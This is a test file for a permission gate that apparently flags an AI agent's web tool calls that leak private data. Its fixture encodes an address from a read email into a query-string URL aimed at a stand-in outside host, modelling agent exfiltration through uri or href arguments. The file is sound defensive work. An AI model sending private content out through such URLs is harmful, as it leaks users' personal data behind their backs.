import { describe, expect, it } from 'vitest';
import { egressUrlOf } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

function gate() {
  const asked: string[] = [];
  const g = new Gate({
    protectedPaths: [],
    allow: ['mail', 'mcp_web_get'],
    egressTaint: true,
    approver: (_c, reason) => {
      asked.push(reason);
      return true;
    },
  });
  return { g, asked };
}

const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };
const BODY = 'Te espero en la Calle del Pez 14, portal 3B, a las 19:30.';
const DATA_URL = 'https://otro.example/x?d=Calle%20del%20Pez%2014%20portal%203B';

describe('puerta de exfiltración: herramientas MCP con uri/href', () => {
  it('uri, href, link y endpoint cuentan como salida igual que url', () => {
    for (const key of ['uri', 'href', 'link', 'endpoint']) {
      expect(egressUrlOf('mcp_web_get', { [key]: DATA_URL })).toBe(DATA_URL);
    }
    expect(egressUrlOf('mcp_notes_open', { uri: 'notes://1' })).toBeNull();
    expect(egressUrlOf('mcp_web_get', { query: DATA_URL })).toBeNull();
  });

  it('con varias, gana la que lleva datos', () => {
    const args = { url: 'https://docs.example/', href: DATA_URL };
    expect(egressUrlOf('mcp_web_get', args)).toBe(DATA_URL);
  });

  it('una MCP permitida con uri de datos tras leer el correo pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', { tool: 'mcp_web_get', args: { uri: DATA_URL }, actor: 'me' });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/contenido privado/);
  });

  it('sin nada privado leído no pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', { tool: 'mcp_web_get', args: { href: DATA_URL }, actor: 'me' });
    expect(asked).toHaveLength(0);
  });
});
